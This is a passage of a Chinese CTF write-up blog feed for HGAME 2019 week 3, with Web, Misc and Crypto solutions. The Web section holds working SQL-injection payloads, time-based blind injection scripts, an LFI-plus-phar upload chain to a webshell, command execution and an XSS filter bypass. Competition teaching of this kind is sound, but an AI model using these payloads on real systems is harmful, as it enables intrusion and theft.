    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;HappyXSS&quot;&gt;&lt;a href=&quot;#HappyXSS&quot; class=&quot;headerlink&quot; title=&quot;Happy</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="php" scheme="v0w.top/tags/php/"/>
    
    <category term="代码审计" scheme="v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="XSS" scheme="v0w.top/tags/XSS/"/>
    
    <category term="python" scheme="v0w.top/tags/python/"/>
    
    <category term="SSTI" scheme="v0w.top/tags/SSTI/"/>
    
    <category term="反序列化" scheme="v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame2019-week3-WP</title>
    <link href="v0w.top/2019/02/15/week3-WP/"/>
    <id>v0w.top/2019/02/15/week3-WP/</id>
    <published>2019-02-14T16:00:00.000Z</published>
    <updated>2020-07-18T10:46:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h2><blockquote><p>Description<br>flag在根目录下(请善待学生机)<br>hint:md5碰撞 你自己本地去生成3个md5值一样的 sha值不一样的 用curl上传<br>URL <a href="http://118.25.89.91:8080/question/login.php">http://118.25.89.91:8080/question/login.php</a></p></blockquote><p>首先发现源码泄露 <code>.login.php.swp</code> </p><p><code>vim -r</code>恢复出源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> @$_POST[<span class="string">&#x27;password&#x27;</span>] <span class="keyword">and</span> @$_POST[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        $username = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        $password = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        $code     = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input can&#x27;t be the same&quot;</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Good&quot;</span>; </span><br><span class="line"></span><br><span class="line">            header(<span class="string">&#x27;Location: admin.php&#x27;</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Invalid password&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...[OMITTED]...</span></span><br></pre></td></tr></table></figure><p>要求提交三个内容不同而 MD5 哈希值相同的字符串进行登录，由于对参数进行强制类型转换且使用全等进行判断，无法通过一般的数组参数、0e 开头 MD5 等方法绕过。</p><p>只能通过 MD5 碰撞的方法，使用 <a href="https://github.com/upbit/clone-fastcoll">fastcoll</a> 或 <a href="https://github.com/thereal1024/python-md5-collision">thereal1024/python-md5-collision</a> 生成一些文件</p><p>选三个文件将其内容编码后用于登录，成功后跳转至 admin.php，是一个 webshell</p><p><img src="https://i.loli.net/2019/02/23/5c70ad5cd25e1.png"></p><p>通过 <code>ls /</code> 命令可以看到 /flag，但直接 <code>cat /flag</code> 会提示无法获取</p><p>读一下 admin.php ，发现其中对输入的命令有过滤：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;The Command is : $cmd &lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">$cmd = str_replace(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;none&#x27;</span>,$cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Result is :&quot;</span>;system($cmd); <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Login First&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    header(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行 <code>cat /fla?</code> 即可读取 flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;a1c83b66cc504d583c09ea6c20c0dabc&#125;</span><br></pre></td></tr></table></figure><h2 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h2><p>数字型注入，简单的union注入就可以了，没有任何过滤。只有一个md5的类似验证码的code，python生成一下也很容易。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmd5</span>(<span class="params">code</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999999</span>):</span><br><span class="line">temp = hashlib.md5(str(i)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> temp[<span class="number">0</span>:<span class="number">4</span>] == code:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> getmd5(<span class="string">&#x27;43dd&#x27;</span>)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;id&#x3D;-1 union select database() #            hgame</span><br><span class="line">&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #  f1l1l1l1g,words</span><br><span class="line">&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;f1l1l1l1g&#39;#f14444444g</span><br><span class="line">&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g#hgame&#123;sql1_1s_iNterest1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h2><p>由于没有回显，只能盲注，又注意到不论返回结果如何，只要SQL语句没有语法错误就会显示<code>sql execute</code>，于是只能进行时间盲注：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"># __author__ &#x3D; V0W</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">guess &#x3D; string.printable[:95]</span><br><span class="line"># print guess</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;118.89.111.179:3001&quot;</span><br><span class="line">sess &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">def getmd5(code):</span><br><span class="line">for i in range(999999):</span><br><span class="line">temp &#x3D; hashlib.md5(str(i)).hexdigest()</span><br><span class="line">if temp[0:4] &#x3D;&#x3D; code:</span><br><span class="line">return i</span><br><span class="line"></span><br><span class="line">def md5(code):</span><br><span class="line">temp &#x3D; hashlib.md5(str(code)).hexdigest()</span><br><span class="line">return temp</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">for c in guess:</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;118.89.111.179:3001&quot;</span><br><span class="line">r &#x3D; sess.get(url).text</span><br><span class="line"># print r</span><br><span class="line">targetmd5 &#x3D; r[79:83]</span><br><span class="line"># print targetmd5</span><br><span class="line">code &#x3D; getmd5(targetmd5)</span><br><span class="line">url &#x3D; url + &quot;?code&#x3D;&quot; + str(code)</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((length(database())&#x3D;%s),sleep(5),1)#&quot; %c</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((database()),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; %(i,c)</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; % (i,c)</span><br><span class="line"># payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F11111114G&#39;),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; % (i,c)</span><br><span class="line">payload &#x3D; &quot;&amp;id&#x3D;1 and if((substr((select fL4444Ag from F11111114G limit 0,1),%d,1)&#x3D;&#39;%s&#39;),sleep(5),1)#&quot; % (i,c)</span><br><span class="line"># print payload</span><br><span class="line">url &#x3D; url + payload</span><br><span class="line"># print url        </span><br><span class="line">time_start &#x3D; time.time()</span><br><span class="line">content &#x3D; sess.get(url).content</span><br><span class="line">print content</span><br><span class="line">time_end &#x3D; time.time()</span><br><span class="line">timedif &#x3D; time_end - time_start</span><br><span class="line">print timedif</span><br><span class="line">if timedif &gt;&#x3D; 4.5:</span><br><span class="line">    flag +&#x3D; c</span><br><span class="line">    print flag</span><br><span class="line">    break</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"># -------盲注得到的数据库信息----------</span><br><span class="line"># dblen: 5</span><br><span class="line"># dbnmae: hgame</span><br><span class="line"># tbname: F11111114G,words</span><br><span class="line"># colname: fL4444Ag</span><br><span class="line"># flag: hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure><h2 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h2><p>非常完整且有一定难度的题目，考察点多，先膜一下出题师傅。</p><p>一个包含以下功能的 web 应用：</p><ul><li>用户注册、登录、上传头像、更改密码</li><li>留言查看、新建、删除</li></ul><p>首先注册账号，登录后尝试一下各种功能，发现显示不同的页面是根据 <code>index.php?action=user</code> 中的 action 参数来切换的，直接访问 user.php 可以返回一部分 HTML，但是不如之前全。</p><p><img src="https://i.loli.net/2019/02/23/5c709fa594c57.png"></p><p><img src="https://i.loli.net/2019/02/23/5c709f8015047.png"></p><p>猜测在 index.php 中是通过 require 或 include 相应的文件来显示不同的页面，存在本地文件包含漏洞</p><p>利用LFI可以读出全部源码<code>http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=index</code></p><p>同理，拿下其他代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.phpregister.phpindex.phpuser.phpmessage.php</span><br><span class="line">messages_api.phpfunctions.phpconfig.php</span><br></pre></td></tr></table></figure><p>关键代码在<code>functions.php</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">&#x27;image/gif&#x27;</span> || $type == <span class="string">&#x27;image/jpeg&#x27;</span> || $type == <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="literal">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;./img/avatar/&quot;</span> . $name . <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">            $sql_query = <span class="string">&quot;update `users` set `avatar`=&#x27;$name&#x27; WHERE `user_id`=$user_id&quot;</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;./img/avatar/&quot;</span> . $avatar[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">&quot;select `avatar` from `users` where `avatar`=$tmp&quot;</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在管理页面（<code>index.php?action=user</code>）可以上传新头像（<code>upload_avatar()</code>）存在一个上传漏洞，可以以此来getshell，但是命名规则是随机的（<code>rand_filename</code>）。</p><p>但是注意到存在SQL注入，找了一个比较容易注入的点<code>delete_message</code>,在messge_id处进行注入。通过该注入可以得到本用户头像的文件名（15位的随机字符串），文件为 <code>./img/avatar/*.png</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span>(<span class="params">$message_id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;token&#x27;</span>] === $_SESSION[<span class="string">&#x27;token&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;groups&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">&quot;delete from `messages` where `message_id`=$message_id and `user_id`=$user_id&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">&#x27;groups&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">&quot;delete from `messages` where `message_id`=$message_id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是利用这个删除信息的注入点，尝试盲注读文件名，盲注脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">restr = <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; value=&#x27;(.*?)&#x27; id=&#x27;token&#x27;&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://111.231.140.29:10080/index.php&#x27;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;5qe3nisl6jg15e8rj980l6jlah&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;v0w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;groups&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url2 = <span class="string">&#x27;http://111.231.140.29:10080/messages_api.php?action=delete&#x27;</span></span><br><span class="line">url3 = <span class="string">&#x27;http://111.231.140.29:10080/messages_api.php?action=add&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">r = requests.get(url=url,cookies=cookie)</span><br><span class="line">token = re.findall(restr,r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># token会失效，需要每次请求拿token</span></span><br><span class="line"><span class="comment"># payload = &quot;-1 or if((ascii(substr((database()),%d,1))=%d),sleep(5),0)#&quot;%(i,j)</span></span><br><span class="line">payload = <span class="string">&quot;-1 or if((ascii(substr((select avatar from users where username like 0x763077),%d,1))=%d),sleep(5),0)#&quot;</span>%(i,j)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;message_id&#x27;</span>:payload,</span><br><span class="line"><span class="string">&#x27;token&#x27;</span>:token</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(data=data,cookies=cookie,url=url2,timeout=<span class="number">4.5</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">            <span class="comment"># 因为是删除的注入点，成功时会将message删除，需要写新的message</span></span><br><span class="line">r = requests.get(url=url, cookies=cookie)</span><br><span class="line">token = re.findall(restr, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>]</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;new_message&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(data=data,cookies=cookie,url=url3)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=========注入信息==========</span></span><br><span class="line"><span class="comment"># DB: lyb</span></span><br><span class="line"><span class="comment"># Picname: eda47772498d3bc</span></span><br></pre></td></tr></table></figure><p>可以上传含有恶意代码的 php 文件来进行进一步渗透，而要使上传的头像（.png 文件）被解析为 php 执行，需要用到 index.php 中的本地文件包含漏洞（<code>require $page .&#39;.php&#39;;</code>）</p><p>由于强制在参数后添加 “.php”，而头像文件以 “.png” 结尾，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$page = array_key_exists(<span class="string">&#x27;action&#x27;</span>, $_GET) ? $_GET[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;message&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;template/footer.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以将 php 文件添加至 zip 压缩包上传，然后通过 <code>phar</code>协议使其被包含（<code>index.php?action=phar://img/avatar/eda47772498d3bc.png/v</code>）  </p><p>因为代码对文件的判断只做了<code>File-type</code>的判断，很容易绕过，拿到shell：</p><p><img src="https://i.loli.net/2019/02/23/5c70abf41ffe9.png"></p><p>找flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v&#x3D;system(&#39;find &#x2F; -name flag&#39;);</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;flag &#x2F;usr&#x2F;lib&#x2F;flag&#x2F;flag</span><br></pre></td></tr></table></figure><p>直接读发现没法读，但是发现同目录中有一个<code>get_flag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v&#x3D;system(&quot;ls &#x2F;usr&#x2F;lib&#x2F;flag&quot;);</span><br><span class="line">flag get_flag</span><br></pre></td></tr></table></figure><p>根据题目提示，可以通过<code>gte_flag</code>来读flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v&#x3D;system(&quot;&#x2F;usr&#x2F;lib&#x2F;flag&#x2F;get_flag &#x2F;usr&#x2F;lib&#x2F;flag&#x2F;flag&quot;);</span><br><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyXss"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</h2><blockquote><p>Description<br>save按钮尝试xss(尝试过程不需要输验证码)，成功后带上验证码code，submit按钮提交xss语句；flag在admin的cookie里面,格式hgame{xxxxx}。<br>URL <a href="http://118.25.18.223:9000/index.php">http://118.25.18.223:9000/index.php</a></p></blockquote><p>waf是将<code>&lt;/srcipt&gt;</code>替换成空。双写即可绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;[url]&gt;&lt;&#x2F;scr&lt;&#x2F;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Xss_1s_funny&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="至少像那雪一样"><a href="#至少像那雪一样" class="headerlink" title="至少像那雪一样"></a>至少像那雪一样</h2><blockquote><p>Description<br>出题人想不好题目描述了<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg">http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg</a></p></blockquote><p>一张图片，binwalk看了一眼发现里面有压缩包，所以直接改后缀为.zip试了一下，发现压缩包有加密，拖进HxD发现并不是伪加密，也没有发现密码有关的信息，于是就考虑了一下CRC32明文攻击，用foremost分离出原图片和压缩包，发现原图片zip压缩后的CRC32值和压缩包里的图片的值是一样的，于是就用工具进行明文攻击。。</p><p>跑了一个多小时，成功的得到解密之后的压缩包，这时发现了一个240字节的空txt文件，于是拖进HxD,</p><p><img src="https://i.loli.net/2019/02/23/5c70aeab0e79c.png"></p><p>刚开始认为是敲击码，但是发现数目并不成对，匹配不上。。后来脑洞了一下，将09看作0，20看作1，组成一串二进制，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01101000 01100111 01100001 01101101 01100101 01111011 01000001 01110100 01011111 01001100 01100101 01100001 00110101 01110100 01011111 01001100 00110001 01101011 01100101 01011111 01110100 01001000 01100001 01110100 01011111 01110011 01101110 00110000 01110111 01111101</span><br></pre></td></tr></table></figure><p>转文本，就得到了flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;At_Lea5t_L1ke_tHat_sn0w&#125;</span><br></pre></td></tr></table></figure><h2 id="旧时记忆"><a href="#旧时记忆" class="headerlink" title="旧时记忆"></a>旧时记忆</h2><blockquote><p>Description<br>愉快的送（nao）分（dong）题，大家一起来学历史吧，结果加上hgame{}（字母均为大写）<br>hint:memory<br>又一个hint:存储器<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg">http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg</a></p></blockquote><p><img src="https://i.loli.net/2019/02/23/5c70b0a351add.jpg"></p><p>在给出hint之后，结合题目，旧时记忆，想到最初计算机用于存储数据（记忆）的工具，打孔卡，于是就google到了相关的信息：</p><blockquote><ul><li>数字通过在行0至行9直接打1个孔来表示。</li><li>空格符的表示，不需要打孔。</li><li>字母用2个孔表示：一个孔在第11、第12、第0行；另一个孔在第1至第9行。字母表被依次分为由9个字母组成的区（”zones”），每个区的字母依次在第1至第9行打孔。每个区分别在第11、第12、第0行打孔。第3区第1个字符保留未使用。（如在（11,3）则为1*9+3 = 12（L））</li><li>一些特殊字符使用了额外的单孔表示，或者双孔表示。</li><li>大多数特殊字符（如标点符号等）用3孔表示：第8行被穿孔；第0、第11、第12行有1个穿孔；第1到第7行有1个穿孔。第9行保留未使用</li></ul></blockquote><p>根据这个，一一对照，得出flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0LD_DAY5%M3MORY</span><br></pre></td></tr></table></figure><h2 id="听听音乐？"><a href="#听听音乐？" class="headerlink" title="听听音乐？"></a>听听音乐？</h2><blockquote><p>Description<br>一首MP3,好好听哦，flag由大写英文字母、数字以及下划线组成，记得添加hgame{}<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3">http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3</a></p></blockquote><p><code>audacity</code>打开看波形，类似莫斯电码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..-. .-.. .- --. ---... .---- - ..--.- .--- ..- ..... - ..--.- ....- ..--.- . .- ... -.-- ..--.- .-- .- ...-</span><br><span class="line"></span><br><span class="line">FLAG:1T_JU5T_4_EASY_WAV</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="P4ndd-n"><a href="#P4ndd-n" class="headerlink" title="P4ndd!n@!"></a>P4ndd!n@!</h2><blockquote><p>Description<br>Aris跑了过来 嘴里大喊”CBC!” 并递给了我一张纸条<br>lpFsOPZm9UztVP30SHertuXoWkOEP4Ij7UcjGM1xvFIw78Ti15UwL9YY0xn4syBxW/2BgzRtsZHGksUmWgfr5Q==(参数要用base64编码一发)<br>hint: padding oracle<br>URL <a href="http://47.95.212.185:23450/padding?text=">http://47.95.212.185:23450/padding?text=</a></p></blockquote><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><blockquote><p>Description<br>e = 12<br>p = 58380004430307803367806996460773123603790305789098384488952056206615768274527<br>q = 81859526975720060649380098193671612801200505029127076539457680155487669622867<br>ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</p><p>算出的m转化成字符串<br>URL <a href="http://example.com/">http://example.com/</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 当指数e和Phi(n)不互素时</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a,b = b,a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        tem = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = tem</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invalidExponent</span>(<span class="params">p,q,e,c</span>):</span></span><br><span class="line">    phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    GCD = gcd(e, phiN)</span><br><span class="line">    <span class="keyword">if</span> (GCD == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Public exponent is valid.....&quot;</span></span><br><span class="line">    d = inverse(e//GCD,phiN)</span><br><span class="line">    c = pow(c, d, n)</span><br><span class="line">    plaintext = sympy.root(c, GCD)</span><br><span class="line">    plaintext = long_to_bytes(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">    q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span 